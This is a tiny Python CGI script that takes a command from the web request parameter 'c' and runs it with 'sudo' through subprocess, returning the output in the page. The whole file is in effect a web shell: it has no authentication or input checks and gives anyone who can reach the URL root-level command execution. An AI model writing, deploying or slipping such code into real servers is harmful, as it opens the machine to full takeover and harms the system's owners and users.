import cgi
import subprocess as sp

print("content-type: text/html")
print()

cmd = cgi.FieldStorage().getvalue("c")
#print("hello d...!!")
o = sp.getoutput("sudo " + cmd)
print(o)
